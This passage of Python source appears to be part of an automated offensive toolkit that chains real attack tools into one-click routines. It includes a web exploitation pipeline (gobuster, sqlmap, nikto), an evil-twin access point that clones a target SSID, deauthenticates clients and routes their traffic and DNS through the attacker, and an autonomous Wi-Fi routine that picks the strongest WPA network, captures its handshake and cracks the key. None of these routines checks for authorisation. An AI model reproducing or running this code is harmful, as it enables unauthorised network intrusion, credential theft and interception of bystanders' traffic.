            self._print(f"  ⚠️ {v}")

        self._print("\n" + "━" * 50)
        self._print(f"🏁 Network Dominate Complete — {len(results['services'])} services, {len(results['brute_results'])} cracked")
        self._print("━" * 50)
        return results

    def oneclick_web_pwn(self, target_url: str) -> dict:
        """
        ONE-CLICK: Web Pwn — Full automated web exploitation.
        WAF detect → Directory brute → SQL injection → SSL audit → Nikto scan.
        """
        self._print("━" * 50)
        self._print("🌐 ONE-CLICK: Web Pwn")
        self._print("━" * 50)

        results = {"waf": None, "dirs": [], "sqli": None, "ssl": None, "nikto": None}

        # Phase 1: WAF Detection
        self._print("\n[PHASE 1/5] WAF Detection")
        waf = self.wafdetect.detect(target_url)
        results["waf"] = waf
        if waf["waf_detected"]:
            self._print(f"  🛡️ WAF detected: {waf['waf_name']}")
        else:
            self._print("  ✅ No WAF detected — target is unprotected")

        # Phase 2: Directory Brute-Force
        self._print("\n[PHASE 2/5] Directory Discovery (gobuster)")
        dir_result = self.layer.run(
            f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirb/common.txt -t 30 --no-error -q",
            timeout=180
        )
        results["dirs"] = dir_result.stdout[:2000]
        found_dirs = len([l for l in dir_result.stdout.splitlines() if l.strip()])
        self._print(f"  Found {found_dirs} paths")

        # Phase 3: SQL Injection
        self._print("\n[PHASE 3/5] SQL Injection Testing (sqlmap)")
        sqli_result = self.layer.run(
            f"sqlmap -u '{target_url}' --batch --crawl=2 --level=2 --risk=1 --threads=5",
            timeout=300
        )
        results["sqli"] = sqli_result.stdout[-2000:]
        if "injectable" in sqli_result.stdout.lower():
            self._print("  💉 SQL INJECTION FOUND!")
        else:
            self._print("  No SQL injection found")

        # Phase 4: SSL/TLS Audit
        self._print("\n[PHASE 4/5] SSL/TLS Audit")
        ssl = self.sslscan.scan(target_url.replace("http://", "").replace("https://", "").split("/")[0])
        results["ssl"] = ssl
        if ssl.get("vulnerabilities"):
            for v in ssl["vulnerabilities"]:
                self._print(f"  ⚠️ {v}")
        else:
            self._print("  ✅ SSL/TLS looks clean")

        # Phase 5: Nikto
        self._print("\n[PHASE 5/5] Web Vulnerability Scan (nikto)")
        nikto = self.layer.run(f"nikto -h {target_url} -maxtime 120s", timeout=130)
        results["nikto"] = nikto.stdout[-2000:]
        vuln_count = nikto.stdout.count("OSVDB-") + nikto.stdout.count("+ /")
        self._print(f"  Found {vuln_count} potential issues")

        self._print("\n" + "━" * 50)
        self._print("🏁 Web Pwn Complete")
        self._print("━" * 50)
        return results

    def oneclick_stealth_recon(self, target: str) -> dict:
        """
        ONE-CLICK: Stealth Recon — Passive reconnaissance only.
        OSINT → DNS enum → WHOIS → Passive port scan → SSL cert info.
        No active exploitation. Safe for pre-engagement.
        """
        self._print("━" * 50)
        self._print("👁️ ONE-CLICK: Stealth Recon (Passive Only)")
        self._print("━" * 50)

        results = {"osint": None, "dns": None, "whois": None, "ports": None, "ssl": None}

        # Phase 1: OSINT
        self._print("\n[PHASE 1/5] OSINT Harvesting")
        osint = self.harvester.harvest(target, limit=100, timeout=60)
        results["osint"] = osint
        self._print(f"  📧 {osint['email_count']} emails  |  🌐 {osint['subdomain_count']} subdomains")

        # Phase 2: DNS
        self._print("\n[PHASE 2/5] DNS Enumeration")
        dns = self.layer.run(f"dig {target} ANY +noall +answer && dig {target} MX +noall +answer && dig {target} NS +noall +answer", timeout=15)
        results["dns"] = dns.stdout
        self._print(f"  {len(dns.stdout.splitlines())} DNS record(s)")

        # Phase 3: WHOIS
        self._print("\n[PHASE 3/5] WHOIS Lookup")
        whois = self.layer.run(f"whois {target} | head -50", timeout=15)
        results["whois"] = whois.stdout
        self._print(f"  Retrieved registration data")

        # Phase 4: Conservative port scan
        self._print("\n[PHASE 4/5] Port Scan (top 100, no scripts)")
        scan = self.nmap.scan(target, flags="-T2 -F --top-ports 100", timeout=120)
        results["ports"] = scan
        total_ports = sum(len(h.get("ports", [])) for h in scan.get("hosts", []))
        self._print(f"  {total_ports} open port(s)")

        # Phase 5: SSL cert
        self._print("\n[PHASE 5/5] SSL Certificate Info")
        ssl = self.sslscan.scan(target)
        results["ssl"] = ssl
        self._print(f"  {ssl.get('ciphers_found', 0)} cipher(s)")

        self._print("\n" + "━" * 50)
        self._print("🏁 Stealth Recon Complete — No active exploitation performed")
        self._print("━" * 50)
        return results

    def oneclick_evil_twin(self, interface: str, target_bssid: str, target_ssid: str, target_channel: int, internet_interface: str = "eth0") -> dict:
        """
        ONE-CLICK: Evil Twin — Automated rogue AP + credential capture.
        Creates evil twin, deauths clients from real AP, captures credentials.
        """
        self._print("━" * 50)
        self._print("👿 ONE-CLICK: Evil Twin Attack")
        self._print("━" * 50)

        # Phase 1: Write configs
        self._print("\n[PHASE 1/4] Generating Evil Twin configs")
        self.layer.run(f"""cat > /tmp/james_hostapd.conf << 'CONF'
interface={interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel={target_channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
CONF""", sudo=True, timeout=5)

        self.layer.run(f"""cat > /tmp/james_dnsmasq.conf << 'CONF'
interface={interface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=10.0.0.1
address=/#/10.0.0.1
CONF""", sudo=True, timeout=5)

        # Phase 2: Network setup
        self._print("\n[PHASE 2/4] Configuring network")
        self.layer.run(f"ifconfig {interface} up 10.0.0.1 netmask 255.255.255.0", sudo=True, timeout=5)
        self.layer.run(f"echo 1 > /proc/sys/net/ipv4/ip_forward", sudo=True, timeout=5)
        self.layer.run(f"iptables --flush && iptables --table nat --flush", sudo=True, timeout=5)
        self.layer.run(f"iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE", sudo=True, timeout=5)
        self.layer.run(f"iptables -A FORWARD -i {interface} -o {internet_interface} -j ACCEPT", sudo=True, timeout=5)

        # Phase 3: Launch services
        self._print("\n[PHASE 3/4] Launching Evil Twin AP")
        hostapd_proc = self.layer.run_background(f"hostapd /tmp/james_hostapd.conf", sudo=True)
        time.sleep(2)
        dnsmasq_proc = self.layer.run_background(f"dnsmasq -C /tmp/james_dnsmasq.conf -d", sudo=True)
        time.sleep(1)

        # Phase 4: Deauth real AP
        self._print("\n[PHASE 4/4] Deauthing clients from real AP")
        mon_iface = self._mon_iface(interface)
        self.layer.run(f"timeout 20 aireplay-ng -0 30 -a {target_bssid} {mon_iface}", sudo=True, timeout=25)

        self._print("\n👿 Evil Twin is LIVE!")
        self._print(f"  SSID:      {target_ssid}")
        self._print(f"  Gateway:   10.0.0.1")
        self._print(f"  Interface: {interface}")
        self._print(f"\n  Clients connecting will be routed through you.")
        self._print(f"  DNS queries logged to dnsmasq output.")

        return {
            "status": "active",
            "ssid": target_ssid,
            "gateway": "10.0.0.1",
            "hostapd_pid": hostapd_proc.pid,
            "dnsmasq_pid": dnsmasq_proc.pid,
        }

    # ── skills ──────────────────────────────────────────────────

    def load_skill(self, name: str) -> dict:
        """Load a JSON skill definition from the skills directory."""
        path = SKILLS_DIR / f"{name}.json"
        if not path.exists():
            return {"error": f"Skill '{name}' not found at {path}"}
        with open(path) as f:
            return json.load(f)

    def list_skills(self) -> list[str]:
        """Return names of available skill files (cached)."""
        if self._skill_cache is None:
            if not SKILLS_DIR.exists():
                self._skill_cache = []
            else:
                self._skill_cache = sorted(p.stem for p in SKILLS_DIR.glob("*.json"))
        return self._skill_cache

    def invalidate_skill_cache(self):
        """Force re-scan of skills directory on next list_skills() call."""
        self._skill_cache = None

    def auto_wifi_pwn(self, interface: str, wordlist: str) -> dict:
        """
        Fully autonomous end-to-end Wi-Fi auditing workflow.
        Selects target, captures handshake, and cracks it.
        """
        self._print("[AUTOPWN] Starting autonomous Wi-Fi audit...")
        
        # 1. Prep
        self.aircrack.check_kill()
        mon_result = self.start_monitor(interface)
        mon_iface = self._mon_iface(interface)
        
        # 2. Recon
        self._print("[AUTOPWN] Scanning for targets (15s)...")
        recon_prefix = "/tmp/james_recon"
        self.layer.run(f"rm -f {recon_prefix}*")
        
        proc = self.aircrack.start_airodump(mon_iface, write_prefix=recon_prefix)
        time.sleep(15)
        self.layer.kill_background(proc)
        
        # 3. Target Selection
        csv_files = sorted(glob.glob(f"{recon_prefix}*.csv"))
        if not csv_files:
            self.stop_monitor(mon_iface)
            return {"error": "Failed to generate scan results."}
            
        with open(csv_files[0], "r", encoding="utf-8", errors="ignore") as f:
            parsed = self.aircrack.parse_airodump_csv(f.read())
            
        # Filter WPA APs and sort by power
        aps = [ap for ap in parsed["aps"] if "WPA" in ap["privacy"]]
        if not aps:
            self.stop_monitor(mon_iface)
            return {"error": "No WPA networks found in range."}
            
        # Sort by power descending (power is usually negative, so we want the maximum value closest to 0)
        aps.sort(key=lambda x: x["power"], reverse=True)
        target = aps[0]
        
        self._print(f"[AUTOPWN] Selected Target: {target['bssid']} ({target['essid']}) on Channel {target['channel']}")
        
        # 4. Targeted Capture
        cap_prefix = "/tmp/james_capture"
        self.layer.run(f"rm -f {cap_prefix}*")
        
        cap_proc = self.aircrack.start_airodump(
            mon_iface, 
            channel=target["channel"], 
            bssid=target["bssid"], 
            write_prefix=cap_prefix
        )
        
        # 5. Deauth & Capture Loop
        self._print("[AUTOPWN] Initiating capture and deauth attacks...")
        handshake_found = False
        cap_file = f"{cap_prefix}-01.cap"
        
        for attempt in range(3):
            time.sleep(5) # Let it listen
            self.aircrack.deauth(mon_iface, target["bssid"], count=5)
            self._print(f"[AUTOPWN] Sent deauth frames (Attempt {attempt+1}/3)...")
            time.sleep(10) # Wait for re-association
            
            if Path(cap_file).exists() and self.aircrack.check_handshake(cap_file, target["bssid"]):
                handshake_found = True
                self._print("[AUTOPWN] Valid WPA handshake captured!")
                break
                
        # 6. Cleanup Capture
        self.layer.kill_background(cap_proc)
        self.stop_monitor(mon_iface)
        
        # 7. Cracking
        if not handshake_found:
            return {"error": "Failed to capture handshake within the timeout."}
            
        self._print(f"[AUTOPWN] Cracking handshake with {wordlist}...")
        result = self.crack_handshake(cap_file, wordlist, target["bssid"])
        
        if result.get("found"):
            self._print(f"[AUTOPWN] SUCCESS! Key found: {result['key']}")
            return {"success": True, "key": result["key"], "bssid": target["bssid"], "essid": target["essid"]}
        else:
            self._print("[AUTOPWN] Cracking finished: Key not in wordlist.")
            return {"success": False, "error": "Key not in wordlist."}

    def execute_skill_steps(self, skill: dict, context: dict):
        """Execute the steps of a skill sequentially using the provided context."""
        from james.layers.native import CommandResult  # noqa: local to avoid circular at module level

        self._print(f"[SKILL] Running: {skill.get('name', 'unknown')}")

        for step in skill.get("steps", []):
            action = step.get("action")
            params = {}
            for k, v in step.get("params", {}).items():
                if isinstance(v, str) and v.startswith("{{") and v.endswith("}}"):
                    var_name = v[2:-2].strip()
                    params[k] = context.get(var_name, v)
                elif isinstance(v, str):
                    # Inline {{var}} substitution using pre-compiled regex
                    for match in _TEMPLATE_VAR_RE.finditer(v):
                        vname = match.group(1)
                        v = v.replace(match.group(0), context.get(vname, match.group(0)))
                    params[k] = v
                else:
                    params[k] = v
            
            try:
                if "." in action:
                    tool_name, method_name = action.split(".", 1)
                    # Lazy-init tool map (built once, reused)
                    if self._tool_map is None:
                        self._tool_map = {
                            "nmap": self.nmap, "aircrack": self.aircrack,
                            "hashcat": self.hashcat, "john": self.john,
                            "masscan": self.masscan, "responder": self.responder,
                            "harvester": self.harvester, "sslscan": self.sslscan,
                            "wafdetect": self.wafdetect, "ettercap": self.ettercap,
                            "reaver": self.reaver, "hcxtools": self.hcxtools,
                            "layer": self.layer,
                        }
                    target_obj = self._tool_map.get(tool_name, self)
                else:
                    target_obj = self
                    method_name = action
                
                method = getattr(target_obj, method_name)
                
                # Log step start
                desc = step.get("description", action)
                self._print(f"  → [{step.get('id', '?')}] {desc}")
                entry = self._log(step.get("id", "step"), action, params)
                
                # Execute
                result = method(**params)
                
                # Convert CommandResult to dict for logging
                if isinstance(result, CommandResult):
                    result = result.as_dict()
                
                # Log finish
                self._finish(entry, result)
                
                if isinstance(result, dict) and "error" in result:
                    self._print(f"  ✕ Step failed: {result['error']}")
                    break
            except Exception as e:
                entry = self._log(step.get("id", "error"), action, params)
                self._finish(entry, {"error": str(e)})
                self._print(f"  ✕ Exception: {e}")
                break

        self._print(f"[SKILL] Finished: {skill.get('name', 'unknown')}")

    # ── task log internals ──────────────────────────────────────

    def _log(self, action: str, tool: str, params: dict) -> TaskEntry:
        entry = TaskEntry(action, tool, params)
        entry.status = "running"
        self.task_log.append(entry)
        # Evict oldest entries to prevent unbounded memory growth
        if len(self.task_log) > self.MAX_LOG:
            self.task_log = self.task_log[-self.MAX_LOG:]
        if self.on_task_update:
            self.on_task_update(entry)
        logger.info("[task] %s → %s %s", action, tool, params)
        return entry

    def _finish(self, entry: TaskEntry, result) -> None:
        entry.result = result
        entry.status = "done" if not (isinstance(result, dict) and "error" in result) else "error"
        if self.on_task_update:
            self.on_task_update(entry)

    def export_log(self) -> list[dict]:
        return [e.as_dict() for e in self.task_log]
